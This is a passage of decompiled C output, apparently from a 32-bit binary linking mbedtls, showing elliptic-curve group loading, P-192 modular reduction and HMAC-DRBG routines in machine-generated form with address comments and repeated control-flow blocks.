                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        if (a1 == 0) {
                                                                            // 0x805f2d7
                                                                            result = g3;
                                                                            g1 = result;
                                                                            g3 = v3;
                                                                            g7 = v2;
                                                                            g5 = v1;
                                                                            return result;
                                                                        }
                                                                        // 0x805f328
                                                                        putchar(10);
                                                                        result2 = g3;
                                                                        g1 = result2;
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result2;
                                                                    }
                                                                }
                                                                // 0x805f668
                                                                g3 = v29;
                                                                v15 = v29;
                                                                // branch -> 0x805f2a3
                                                                // 0x805f2a3
                                                                if (v15 < 0) {
                                                                    // 0x805f2e8
                                                                    v16 = a1;
                                                                    g1 = v16;
                                                                    if (v16 != 0) {
                                                                        // 0x805f2ef
                                                                        g1 = printf("Unexpected error, return code = %08X\n", v15);
                                                                        mbedtls_ecp_group_free((char *)g7);
                                                                        g1 = v7;
                                                                        g1 = mbedtls_ecp_point_free(v7);
                                                                        g1 = mbedtls_ecp_point_free(v9);
                                                                        mbedtls_mpi_free((int32_t *)g5);
                                                                        // branch -> 0x805f328
                                                                        // 0x805f328
                                                                        putchar(10);
                                                                        result2 = g3;
                                                                        g1 = result2;
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        return result2;
                                                                    }
                                                                }
                                                                // 0x805f2a7
                                                                mbedtls_ecp_group_free((char *)g7);
                                                                g1 = v7;
                                                                g1 = mbedtls_ecp_point_free(v7);
                                                                g1 = mbedtls_ecp_point_free(v9);
                                                                mbedtls_mpi_free((int32_t *)g5);
                                                                if (a1 == 0) {
                                                                    // 0x805f2d7
                                                                    result = g3;
                                                                    g1 = result;
                                                                    g3 = v3;
                                                                    g7 = v2;
                                                                    g5 = v1;
                                                                    return result;
                                                                }
                                                                // 0x805f328
                                                                putchar(10);
                                                                result2 = g3;
                                                                g1 = result2;
                                                                g3 = v3;
                                                                g7 = v2;
                                                                g5 = v1;
                                                                return result2;
                                                            }
                                                            // 0x805f668
                                                            g3 = v29;
                                                            v15 = v29;
                                                            // branch -> 0x805f2a3
                                                        } else {
                                                            v15 = v9;
                                                        }
                                                    } else {
                                                        v15 = v33;
                                                    }
                                                } else {
                                                    int32_t v43 = *(int32_t *)(4 * v32 - 60 + g2); // 0x805f4cf
                                                    g214 = 0;
                                                    g215 = 0;
                                                    g216 = 0;
                                                    int32_t v44 = mbedtls_mpi_read_string((char *)g5, 16, (char *)v43); // 0x805f44f
                                                    g1 = v44;
                                                    if (v44 != 0) {
                                                        v29 = v44;
                                                        // break -> 0x805f668
                                                        break;
                                                    }
                                                    // continue -> 0x805f45c
                                                    continue;
                                                }
                                                // 0x805f2a3
                                                if (v15 < 0) {
                                                    // 0x805f2e8
                                                    v16 = a1;
                                                    g1 = v16;
                                                    if (v16 != 0) {
                                                        // 0x805f2ef
                                                        g1 = printf("Unexpected error, return code = %08X\n", v15);
                                                        mbedtls_ecp_group_free((char *)g7);
                                                        g1 = v7;
                                                        g1 = mbedtls_ecp_point_free(v7);
                                                        g1 = mbedtls_ecp_point_free(v9);
                                                        mbedtls_mpi_free((int32_t *)g5);
                                                        // branch -> 0x805f328
                                                        // 0x805f328
                                                        putchar(10);
                                                        result2 = g3;
                                                        g1 = result2;
                                                        g3 = v3;
                                                        g7 = v2;
                                                        g5 = v1;
                                                        return result2;
                                                    }
                                                }
                                                // 0x805f2a7
                                                mbedtls_ecp_group_free((char *)g7);
                                                g1 = v7;
                                                g1 = mbedtls_ecp_point_free(v7);
                                                g1 = mbedtls_ecp_point_free(v9);
                                                mbedtls_mpi_free((int32_t *)g5);
                                                if (a1 == 0) {
                                                    // 0x805f2d7
                                                    result = g3;
                                                    g1 = result;
                                                    g3 = v3;
                                                    g7 = v2;
                                                    g5 = v1;
                                                    return result;
                                                }
                                                // 0x805f328
                                                putchar(10);
                                                result2 = g3;
                                                g1 = result2;
                                                g3 = v3;
                                                g7 = v2;
                                                g5 = v1;
                                                return result2;
                                            }
                                        }
                                    }
                                    // 0x805f63a
                                    if (a1 == 0) {
                                        // 0x805f641
                                        g3 = 1;
                                        // branch -> 0x805f2a7
                                    } else {
                                        // 0x805f68c
                                        v31 = g3;
                                        g3 = 1;
                                        g1 = printf("failed (%u)\n", v31);
                                        // branch -> 0x805f2a7
                                    }
                                    // 0x805f2a7
                                    mbedtls_ecp_group_free((char *)g7);
                                    g1 = v7;
                                    g1 = mbedtls_ecp_point_free(v7);
                                    g1 = mbedtls_ecp_point_free(v9);
                                    mbedtls_mpi_free((int32_t *)g5);
                                    if (a1 == 0) {
                                        // 0x805f2d7
                                        result = g3;
                                        g1 = result;
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return result;
                                    }
                                    // 0x805f328
                                    putchar(10);
                                    result2 = g3;
                                    g1 = result2;
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return result2;
                                }
                            }
                            // 0x805f668
                            g3 = v29;
                            v15 = v29;
                            // branch -> 0x805f2a3
                            // 0x805f2a3
                            if (v15 < 0) {
                                // 0x805f2e8
                                v16 = a1;
                                g1 = v16;
                                if (v16 != 0) {
                                    // 0x805f2ef
                                    g1 = printf("Unexpected error, return code = %08X\n", v15);
                                    mbedtls_ecp_group_free((char *)g7);
                                    g1 = v7;
                                    g1 = mbedtls_ecp_point_free(v7);
                                    g1 = mbedtls_ecp_point_free(v9);
                                    mbedtls_mpi_free((int32_t *)g5);
                                    // branch -> 0x805f328
                                    // 0x805f328
                                    putchar(10);
                                    result2 = g3;
                                    g1 = result2;
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return result2;
                                }
                            }
                            // 0x805f2a7
                            mbedtls_ecp_group_free((char *)g7);
                            g1 = v7;
                            g1 = mbedtls_ecp_point_free(v7);
                            g1 = mbedtls_ecp_point_free(v9);
                            mbedtls_mpi_free((int32_t *)g5);
                            if (a1 == 0) {
                                // 0x805f2d7
                                result = g3;
                                g1 = result;
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return result;
                            }
                            // 0x805f328
                            putchar(10);
                            result2 = g3;
                            g1 = result2;
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return result2;
                        }
                        // 0x805f668
                        g3 = v29;
                        v15 = v29;
                        // branch -> 0x805f2a3
                    } else {
                        v15 = v19;
                    }
                } else {
                    v15 = v19;
                }
            } else {
                v15 = v19;
            }
        } else {
            v15 = v7;
        }
    }
    // 0x805f2a3
    if (v15 >= 0) {
        // 0x805f2a7
        mbedtls_ecp_group_free((char *)g7);
        g1 = v7;
        g1 = mbedtls_ecp_point_free(v7);
        g1 = mbedtls_ecp_point_free(v9);
        mbedtls_mpi_free((int32_t *)g5);
        if (a1 == 0) {
            // 0x805f2d7
            result = g3;
            g1 = result;
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return result;
        }
        // 0x805f328
        putchar(10);
        result2 = g3;
        g1 = result2;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result2;
    }
    // 0x805f2e8
    v16 = a1;
    g1 = v16;
    if (v16 != 0) {
        // 0x805f2ef
        g1 = printf("Unexpected error, return code = %08X\n", v15);
        mbedtls_ecp_group_free((char *)g7);
        g1 = v7;
        g1 = mbedtls_ecp_point_free(v7);
        g1 = mbedtls_ecp_point_free(v9);
        mbedtls_mpi_free((int32_t *)g5);
        // branch -> 0x805f328
        // 0x805f328
        putchar(10);
        result2 = g3;
        g1 = result2;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result2;
    }
    // 0x805f2a7
    mbedtls_ecp_group_free((char *)g7);
    g1 = v7;
    g1 = mbedtls_ecp_point_free(v7);
    g1 = mbedtls_ecp_point_free(v9);
    mbedtls_mpi_free((int32_t *)g5);
    if (a1 == 0) {
        // 0x805f2d7
        result = g3;
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    // 0x805f328
    putchar(10);
    result2 = g3;
    g1 = result2;
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result2;
}

// Address range: 0x805f820 - 0x805f85f
int32_t mbedtls_ecp_keypair_init(int32_t a1) {
    int32_t v1 = g3; // 0x805f823
    int32_t result; // 0x805f84f
    if (a1 != 0) {
        // 0x805f82e
        mbedtls_ecp_group_init((char *)a1);
        mbedtls_mpi_init((int32_t *)(a1 + 124));
        g3 = v1;
        int32_t v2;
        result = mbedtls_ecp_point_init(v2);
        g1 = result;
        // branch -> 0x805f858
    }
    // 0x805f858
    g3 = v1;
    return result;
}

// Address range: 0x805fa60 - 0x805fb2f
int32_t ecp_group_load(int32_t a1, uint32_t a2, int32_t a3, uint32_t a4, int32_t a5, uint32_t a6, int32_t a7, uint32_t a8, int32_t a9, uint32_t a10, int32_t a11, int32_t a12, int32_t a13) {
    // 0x805fa60
    g3 = g1;
    *(int32_t *)(g1 + 4) = 1;
    *(int32_t *)(g3 + 8) = g4 / 4;
    *(int32_t *)(g3 + 12) = g6;
    if (a1 != 0) {
        // 0x805fa80
        *(int32_t *)(g3 + 16) = 1;
        *(int32_t *)(g3 + 24) = a1;
        *(int32_t *)(g3 + 20) = a2 / 4;
        // branch -> 0x805fa93
    }
    // 0x805fa93
    *(int32_t *)(g3 + 28) = 1;
    *(int32_t *)(g3 + 76) = 1;
    *(int32_t *)(g3 + 40) = 1;
    *(int32_t *)(g3 + 32) = a4 / 4;
    *(int32_t *)(g3 + 52) = 1;
    *(int32_t *)(g3 + 64) = 1;
    *(int32_t *)(g3 + 68) = 1;
    *(int32_t *)(g3 + 36) = a3;
    *(int32_t *)(g3 + 72) = (int32_t)&g192;
    *(int32_t *)(g3 + 80) = a10 / 4;
    *(int32_t *)(g3 + 84) = a9;
    *(int32_t *)(g3 + 44) = a6 / 4;
    *(int32_t *)(g3 + 48) = a5;
    *(int32_t *)(g3 + 56) = a8 / 4;
    *(int32_t *)(g3 + 60) = a7;
    *(int32_t *)(g3 + 88) = mbedtls_mpi_bitlen(g3 + 4, 0);
    int32_t v1 = mbedtls_mpi_bitlen(g3 + 76, 0); // 0x805fb14
    *(int32_t *)(g3 + 96) = 1;
    *(int32_t *)(g3 + 92) = v1;
    return 0;
}

// Address range: 0x805fb30 - 0x806011f
int32_t mbedtls_ecp_group_load(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t v1 = g7; // 0x805fb33
    int32_t v2 = g3; // 0x805fb34
    g3 = (int32_t)a1;
    g7 = a2;
    g1 = mbedtls_ecp_group_free((char *)a1);
    *(int32_t *)g3 = g7;
    int32_t result; // 0x805fb66_2
    switch (g7) {
        default: {
            // 0x805fb4d
            mbedtls_ecp_group_free((char *)g3);
            result = -0x4e80;
            // branch -> 0x805fb60
            break;
        }
        case 1: {
            // 0x805fbe0
            *(int32_t *)(g3 + 100) = 0x80602c0;
            g4 = 24;
            g6 = &g44;
            g1 = g3;
            ecp_group_load(0, (int32_t)&g45, 24, (int32_t)&g46, 24, (int32_t)&g47, 24, (int32_t)&g48, 24, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 2: {
            // 0x805fc50
            *(int32_t *)(g3 + 100) = 0x80610e0;
            g4 = 32;
            g6 = &g49;
            g1 = g3;
            ecp_group_load(0, (int32_t)&g50, 28, (int32_t)&g51, 28, (int32_t)"4~", 28, (int32_t)&g52, 28, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 3: {
            // 0x805fcc0
            *(int32_t *)(g3 + 100) = 0x8060b40;
            g4 = 32;
            g6 = &g53;
            g1 = g3;
            ecp_group_load(0, (int32_t)&g54, 32, (int32_t)&g55, 32, (int32_t)&g56, 32, (int32_t)&g57, 32, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 4: {
            // 0x805fd30
            *(int32_t *)(g3 + 100) = 0x80604d0;
            g4 = 48;
            g6 = &g58;
            g1 = g3;
            ecp_group_load(0, (int32_t)&g59, 48, (int32_t)&g60, 48, (int32_t)&g61, 48, (int32_t)&g62, 48, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 5: {
            // 0x805fda0
            *(int32_t *)(g3 + 100) = 0x8060220;
            g4 = 68;
            g6 = &g63;
            g1 = g3;
            ecp_group_load(0, (int32_t)&g64, 68, (int32_t)&g65, 68, (int32_t)&g66, 68, (int32_t)&g67, 68, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 6: {
            // 0x805fe10
            g4 = 32;
            g6 = &g83;
            g1 = g3;
            ecp_group_load(32, (int32_t)&g84, 32, (int32_t)&g85, 32, (int32_t)&g86, 32, (int32_t)&g87, 32, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 7: {
            // 0x805fe78
            g4 = 48;
            g6 = &g88;
            g1 = g3;
            ecp_group_load(48, (int32_t)&g89, 48, (int32_t)&g90, 48, (int32_t)&g91, 48, (int32_t)&g92, 48, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 8: {
            // 0x805fee0
            g4 = 64;
            g6 = &g93;
            g1 = g3;
            ecp_group_load(64, (int32_t)&g94, 64, (int32_t)&g95, 64, (int32_t)&g96, 64, (int32_t)&g97, 64, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 9: {
            // 0x805ff48
            *(int32_t *)(g3 + 100) = 0x8060120;
            int32_t v3 = 16;
            int32_t v4 = mbedtls_mpi_read_string((char *)16, (int32_t)"01DB42", (char *)a3); // 0x805ff65
            g1 = v4;
            int32_t v5 = v4; // 0x805ff72
            if (v4 == 0) {
                // 0x8060068
                g7 = g3 + 4;
                v3 = 1;
                int32_t v6 = mbedtls_mpi_lset((char *)1, (int32_t)"01DB42"); // 0x8060076
                g1 = v6;
                if (v6 == 0) {
                    // 0x8060083
                    v3 = 255;
                    int32_t v7 = mbedtls_mpi_shift_l(255, (int32_t)"01DB42"); // 0x806008e
                    g1 = v7;
                    if (v7 == 0) {
                        int32_t v8 = g7; // 0x80600a3
                        v3 = v8;
                        int32_t v9 = mbedtls_mpi_sub_int(v8, 19, a3); // 0x80600aa
                        g1 = v9;
                        if (v9 == 0) {
                            // 0x80600b7
                            *(int32_t *)(g3 + 88) = mbedtls_mpi_bitlen(v3, 19);
                            v3 = 9;
                            int32_t v10 = mbedtls_mpi_lset((char *)9, 19); // 0x80600d0
                            g1 = v10;
                            if (v10 == 0) {
                                // 0x80600dd
                                v3 = 1;
                                int32_t v11 = mbedtls_mpi_lset((char *)1, 19); // 0x80600eb
                                g1 = v11;
                                if (v11 == 0) {
                                    // 0x80600f8
                                    g6 = g3 + 52;
                                    *(int32_t *)(g2 - 12) = 0;
                                    mbedtls_mpi_free((int32_t *)v3);
                                    *(int32_t *)(g3 + 92) = 254;
                                    // branch -> 0x805fb60
                                    // 0x805fb60
                                    g3 = v2;
                                    g7 = v1;
                                    return *(int32_t *)(g2 - 12);
                                }
                                v5 = v11;
                            } else {
                                v5 = v10;
                            }
                        } else {
                            v5 = v9;
                        }
                    } else {
                        v5 = v7;
                    }
                } else {
                    v5 = v6;
                }
            }
            // 0x805ff72
            *(int32_t *)(g2 - 12) = v5;
            mbedtls_ecp_group_free((char *)v3);
            result = *(int32_t *)(g2 - 12);
            // branch -> 0x805fb60
            break;
        }
        case 10: {
            // 0x805ff88
            *(int32_t *)(g3 + 100) = 0x80616a0;
            g4 = 24;
            g6 = &g68;
            g1 = g3;
            ecp_group_load(4, (int32_t)&g69, 4, (int32_t)&g70, 24, (int32_t)&g71, 24, (int32_t)&g72, 24, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 11: {
            // 0x805fff8
            *(int32_t *)(g3 + 100) = 0x80613c0;
            g4 = 28;
            g6 = &g73;
            g1 = g3;
            ecp_group_load(4, (int32_t)&g74, 4, (int32_t)&g75, 28, (int32_t)&g76, 28, (int32_t)&g77, 32, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
        case 12: {
            // 0x805fb70
            *(int32_t *)(g3 + 100) = 0x8061530;
            g4 = 32;
            g6 = &g78;
            g1 = g3;
            ecp_group_load(4, (int32_t)&g79, 4, (int32_t)&g80, 32, (int32_t)&g81, 32, (int32_t)&g82, 32, 0, 0, 0, 0);
            result = 0;
            // branch -> 0x805fb60
            break;
        }
    }
    // 0x805fb60
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x80602c0 - 0x80604cc
int32_t ecp_mod_p192(int32_t a1) {
    int32_t v1 = g3; // 0x80602c5
    g3 = a1;
    int32_t result = mbedtls_mpi_grow(a1, (char *)12); // 0x80602d7
    g1 = result;
    if (result == 0) {
        int32_t v2 = *(int32_t *)(g3 + 8); // 0x80602e4
        int32_t v3 = v2; // edx
        int32_t * v4 = (int32_t *)v2; // 0x80602ea_0
        uint32_t v5 = *v4; // 0x80602ea
        int32_t v6 = 4 * *(int32_t *)(g3 + 4) + v2; // 0x80602ec
        uint32_t v7 = *(int32_t *)(v2 + 24) + v5; // 0x80602f4
        uint32_t v8 = (int32_t)(v7 < v5); // 0x80602f7
        uint32_t v9 = v8 + *(int32_t *)(v2 + 4); // 0x8060302
        uint32_t v10 = v9 + *(int32_t *)(v2 + 28); // 0x8060310
        int32_t * v11 = (int32_t *)(v2 + 40); // 0x806031b_0
        uint32_t v12 = *v11 + v7; // 0x8060327
        *v4 = v12;
        uint32_t v13 = (int32_t)(v12 < *v11) + v10; // 0x8060337
        int32_t v14 = v3; // 0x806033e
        int32_t * v15 = (int32_t *)(v14 + 44); // 0x806033e_0
        uint32_t v16 = v13 + *v15; // 0x8060347
        uint32_t v17 = *v15; // 0x8060349
        *(int32_t *)(v14 + 4) = v16;
        int32_t v18 = v3; // 0x8060357
        int32_t v19 = *(int32_t *)(v18 + 12); // 0x8060357
        uint32_t v20 = (int32_t)(v16 < v17) + (int32_t)(v13 < v10) + (int32_t)(v10 < v9) + (int32_t)(v9 < v8); // 0x806035a
        int32_t * v21 = (int32_t *)(v18 + 8); // 0x806035f_0
        uint32_t v22 = v20 + *v21; // 0x806035f
        uint32_t v23 = (int32_t)(v22 < v20); // 0x8060362
        uint32_t v24 = v23 + v19; // 0x8060368
        uint32_t v25 = v22 + *(int32_t *)(v18 + 24); // 0x806036a
        uint32_t v26 = (int32_t)(v25 < v22); // 0x8060373
        uint32_t v27 = v26 + v24; // 0x806037e
        uint32_t v28 = v27 + *(int32_t *)(v18 + 28); // 0x806038c
        uint32_t v29 = *(int32_t *)(v18 + 32) + v25; // 0x806039f
        uint32_t v30 = (int32_t)(v29 < v25); // 0x80603a5
        uint32_t v31 = v28 + v30; // 0x80603b0
        uint32_t v32 = v31 + *(int32_t *)(v18 + 36); // 0x80603be
        int32_t * v33 = (int32_t *)(v18 + 40); // 0x80603c9_0
        uint32_t v34 = *v33 + v29; // 0x80603da
        *v21 = v34;
        int32_t v35 = (int32_t)(v34 < *v33) + v32; // 0x80603eb
        int32_t v36 = v3; // 0x80603f2
        int32_t v37 = v35 + *(int32_t *)(v36 + 44); // 0x80603fb
        *(int32_t *)(v36 + 12) = v37;
        int32_t v38 = v3; // 0x806040e
        uint32_t v39 = *(int32_t *)(v38 + 44); // 0x806040e
        uint32_t v40 = (int32_t)(v28 < v27) + (int32_t)(v27 < v26) + (int32_t)(v31 < v30) + (int32_t)(v32 < v31) + (int32_t)(v35 < v32) + (int32_t)(v37 < v39) + ((v35 & -256 | (int32_t)(v19 == 0 | v23 < v24)) ^ 1) % 2; // 0x8060420
        int32_t * v41 = (int32_t *)(v38 + 16); // 0x8060423_0
        uint32_t v42 = v40 + *v41; // 0x8060423
        int32_t v43 = v42 < v40; // 0x8060426
        uint32_t v44 = v43 + *(int32_t *)(v38 + 20); // 0x806042f
        uint32_t v45 = v42 + *(int32_t *)(v38 + 32); // 0x8060431
        uint32_t v46 = (int32_t)(v45 < v42); // 0x8060437
        uint32_t v47 = v46 + v44; // 0x806043d
        uint32_t v48 = v47 + *(int32_t *)(v38 + 36); // 0x8060446
        int32_t v49 = v48 < v47; // 0x806044f
        int32_t * v50 = (int32_t *)(v38 + 40); // 0x8060463_0
        uint32_t v51 = v45 + *v50; // 0x8060463
        *v41 = v51;
        uint32_t v52 = v48 + (int32_t)(v51 < *v50); // 0x8060477
        int32_t v53 = v3; // 0x806047e
        int32_t * v54 = (int32_t *)(v53 + 44); // 0x806047e_0
        uint32_t v55 = v52 + *v54; // 0x806047e
        uint32_t v56 = *v54; // 0x8060487
        *(int32_t *)(v53 + 20) = v55;
        *(int32_t *)(v3 + 24) = v49 + (int32_t)(v47 < v46) + (int32_t)(v52 < v48) + (int32_t)(v43 > v44) + (int32_t)(v55 < v56);
        int32_t v57 = v3 + 28; // 0x80604a6
        if (v6 > v57) {
            *(int32_t *)v57 = 0;
            int32_t v58 = v57 + 4; // 0x80604be
            // branch -> 0x80604b8
            while (v6 > v58) {
                // 0x80604b8
                *(int32_t *)v58 = 0;
                v58 += 4;
                // continue -> 0x80604b8
            }
            // 0x80604c5
            // branch -> 0x80604c5
        }
    }
    // 0x80604c5
    g3 = v1;
    return result;
}

// Address range: 0x80604cd - 0x80604cf
int32_t function_80604cd(int32_t a1) {
    // 0x80604cd
    return g7;
}

// Address range: 0x8061810 - 0x806181f
int32_t mbedtls_hmac_drbg_set_prediction_resistance(int32_t result, int32_t a2) {
    // 0x8061810
    *(int32_t *)(result + 84) = a2;
    return result;
}

// Address range: 0x8061820 - 0x806182f
int32_t mbedtls_hmac_drbg_set_entropy_len(int32_t result, int32_t a2) {
    // 0x8061820
    *(int32_t *)(result + 80) = a2;
    return result;
}

// Address range: 0x8061830 - 0x806183f
int32_t mbedtls_hmac_drbg_set_reseed_interval(int32_t result, int32_t a2) {
    // 0x8061830
    *(int32_t *)(result + 88) = a2;
    return result;
}

// Address range: 0x8061840 - 0x8061879
int32_t hmac_drbg_self_test_entropy(int32_t a1, char * a2, int32_t a3) {
    // 0x8061840
    memcpy(a2, (char *)(g218 + a1), a3);
    g218 += a3;
    return 0;
}

// Address range: 0x806187a - 0x806187f
int32_t function_806187a(int32_t a1) {
    // 0x806187a
    return g5;
}

// Address range: 0x8061880 - 0x80618af
int32_t mbedtls_hmac_drbg_free(char * a1) {
    int32_t v1 = g3; // 0x8061883
    g3 = (int32_t)a1;
    int32_t result; // 0x80618af_2
    if (a1 == NULL) {
        // 0x8061880
        result = g1;
        // branch -> 0x80618aa
    } else {
        // 0x806188e
        mbedtls_md_free(a1);
        *(char *)g3 = 0;
        int32_t v2 = g3 + 1; // 0x80618a3
        // branch -> 0x80618a0
        while (v2 != g3 + 100) {
            // 0x80618a0
            *(char *)v2 = 0;
            v2++;
            // continue -> 0x80618a0
        }
        // 0x80618aa
        result = v2;
        // branch -> 0x80618aa
    }
    // 0x80618aa
    g3 = v1;
    return result;
}

// Address range: 0x80618b0 - 0x806199f
int32_t mbedtls_hmac_drbg_update(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x80618b3
    int32_t v2 = g7; // 0x80618b4
    int32_t v3 = g3; // 0x80618b5
    g3 = (int32_t)a1;
    uint32_t v4 = mbedtls_md_get_size(*a1); // 0x80618c1
    g6 = a3;
    g7 = v4 % 256;
    int32_t v5; // 0x80618e8_0
    int32_t v6;
    int32_t v7;
    char v8;
    int32_t v9; // 0x80618e3
    if (a3 != 0) {
        // 0x80618d0
        if (a2 != 0) {
            v8 = 2;
            // 0x80618df
            v6 = 0;
            v9 = g3;
            g5 = v9 + 12;
            v5 = &v7;
            int32_t v10 = v9; // 0x8061935
            // branch -> 0x8061935
            while (true) {
                // 0x8061935
                mbedtls_md_hmac_reset((int32_t *)v10);
                mbedtls_md_hmac_update((int32_t *)g3, g5, g7);
                mbedtls_md_hmac_update((int32_t *)g3, (int32_t)&v6, 1);
                if (v8 == 2) {
                  lab_0x806196e_2:
                    // 0x806196e
                    mbedtls_md_hmac_update((int32_t *)g3, a2, a3);
                    // branch -> 0x80618e8
                }
              lab_0x80618e8_2:
                // 0x80618e8
                mbedtls_md_hmac_finish((int32_t *)g3, v5);
                mbedtls_md_hmac_starts((int32_t *)g3, v5, g7);
                mbedtls_md_hmac_update((int32_t *)g3, g5, g7);
                mbedtls_md_hmac_finish((int32_t *)g3, g5);
                int32_t result = v6 % 256 + 1; // 0x806192a
                if (v8 <= (char)result) {
                    // 0x8061990
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return result;
                }
                // 0x8061932
                v6 = result;
                v10 = g3;
                // branch -> 0x8061935
            }
        }
        // 0x80618db
        v8 = 1;
        // branch -> 0x80618df
        // 0x80618df
        v6 = 0;
        v9 = g3;
        g5 = v9 + 12;
        v5 = &v7;
        // branch -> 0x8061935
        while (true) {
            // 0x8061935
            mbedtls_md_hmac_reset((int32_t *)v9);
            mbedtls_md_hmac_update((int32_t *)g3, g5, g7);
            mbedtls_md_hmac_update((int32_t *)g3, (int32_t)&v6, 1);
            if (v8 == 2) {
                goto lab_0x806196e_2;
            }
            goto lab_0x80618e8_2;
        }
    }
    // 0x80618db
    v8 = 1;
    // branch -> 0x80618df
    // 0x80618df
    v6 = 0;
    v9 = g3;
    g5 = v9 + 12;
    v5 = &v7;
    // branch -> 0x8061935
    while (true) {
        // 0x8061935
        mbedtls_md_hmac_reset((int32_t *)v9);
        mbedtls_md_hmac_update((int32_t *)g3, g5, g7);
        mbedtls_md_hmac_update((int32_t *)g3, (int32_t)&v6, 1);
        if (v8 == 2) {
            goto lab_0x806196e_2;
        }
        goto lab_0x80618e8_2;
    }
}

// Address range: 0x80619a0 - 0x8061a6f
int32_t mbedtls_hmac_drbg_reseed(char * a1, char * a2, uint32_t a3) {
    int32_t v1;
    g2 = &v1;
    int32_t v2 = g3; // 0x80619a9
    g3 = a3;
    int32_t v3 = g7; // 0x80619af
    int32_t v4 = (int32_t)a1;
    g7 = v4;
    int32_t v5 = g5; // 0x80619b5
    if (a3 >= 257 || *(int32_t *)(v4 + 80) + a3 > 384) {
        // 0x80619c0
        // branch -> 0x80619c5
        // 0x80619c5
        g3 = v2;
        g7 = v3;
        g5 = v5;
        return -5;
    }
    // 0x80619e4
    int32_t v6;
    int32_t v7 = &v6; // 0x80619e4_0
    g6 = v7;
    g237 = true;
    g5 = v7;
    g4 = (int32_t)memset((char *)&v6, 0, 96);
    int32_t v8 = g7; // 0x80619fb
    int32_t v9 = *(int32_t *)(v8 + 96); // 0x8061a06
    g1 = v9;
    int32_t v10 = *(int32_t *)(v8 + 92); // 0x8061a0c
    ((int32_t (*)(int32_t, int32_t, int32_t))v10)(v9, g6, *(int32_t *)(v8 + 80));
    g6 = v7;
    int32_t v11 = g1; // 0x8061a15
    g4 = v11;
    int32_t result = -9; // 0x80619d1_2
    if (v11 == 0) {
        int32_t v12 = g3; // 0x8061a20
        int32_t v13 = g7; // 0x8061a22
        int32_t v14 = *(int32_t *)(v13 + 80); // 0x8061a22
        g5 = v14;
        int32_t v15 = v13; // 0x8061a2f
        int32_t v16 = v14; // 0x8061a27
        if (v12 != 0) {
            // 0x8061a42
            if (a2 != NULL) {
                // 0x8061a48
                g4 = (int32_t)a2;
                g5 = v14 + v12;
                memcpy((char *)(v14 + v7), a2, v12);
                v15 = g7;
                v16 = g5;
                // branch -> 0x8061a27
            } else {
                v15 = v13;
                v16 = v14;
            }
        }
        // 0x8061a27
        mbedtls_hmac_drbg_update((int32_t *)v15, v7, v16);
        *(int32_t *)(g7 + 76) = 1;
        result = 0;
        // branch -> 0x80619c5
    }
    // 0x80619c5
    g3 = v2;
    g7 = v3;
    g5 = v5;
    return result;
}

// Address range: 0x8061a70 - 0x8061bbf
int32_t mbedtls_hmac_drbg_random_with_add(char * a1, int32_t a2, int32_t a3, char * a4, int32_t a5) {
    int32_t v1 = g3; // 0x8061a76
    g3 = (int32_t)a1;
    int32_t v2 = g7; // 0x8061a7c
    int32_t v3 = g5; // 0x8061a7f
    g5 = a3;
    g7 = mbedtls_md_get_size(*(int32_t *)a1) % 256;
    if (g5 >= 1025) {
        // 0x8061a9f
        g3 = v1;
        g7 = v2;
        g5 = v3;
        return -3;
    }
    // 0x8061ab0
    int32_t result2; // 0x8061aab_2
    if (a5 <= 256) {
        int32_t v4 = g3; // 0x8061abb
        int32_t * v5; // 0x8061b7e_0
        int32_t * v6;
        int32_t v7;
        int32_t v8; // 0x8061af9
        int32_t v9; // 0x8061b1c
        int32_t v10; // 0x8061b00
        int32_t v11; // 0x8061b03
        int32_t v12; // 0x8061b9e15
        int32_t v13; // 0x8061b5c14
        if (*(int32_t *)(v4 + 92) == 0) {
            // 0x8061b88
            if (a5 != 0) {
                // 0x8061b93
                v7 = (int32_t)a4;
                g4 = v7;
                if (a4 != NULL) {
                    // 0x8061b9e
                    mbedtls_hmac_drbg_update((int32_t *)v4, v7, a5);
                    v12 = a5;
                    // branch -> 0x8061af9
                } else {
                    v12 = a5;
                }
            } else {
                v12 = 0;
            }
        } else {
            // 0x8061ac6
            if (*(int32_t *)(v4 + 84) != 1) {
                // 0x8061acc
                if (*(int32_t *)(v4 + 76) <= *(int32_t *)(v4 + 88)) {
                    // 0x8061b88
                    v12 = 0;
                    if (a5 != 0) {
                        // 0x8061b93
                        v7 = (int32_t)a4;
                        g4 = v7;
                        if (a4 != NULL) {
                            // 0x8061b9e
                            mbedtls_hmac_drbg_update((int32_t *)v4, v7, a5);
                            v12 = a5;
                            // branch -> 0x8061af9
                        } else {
                            v12 = a5;
                        }
                    }
                    // 0x8061af9
                    v8 = g5;
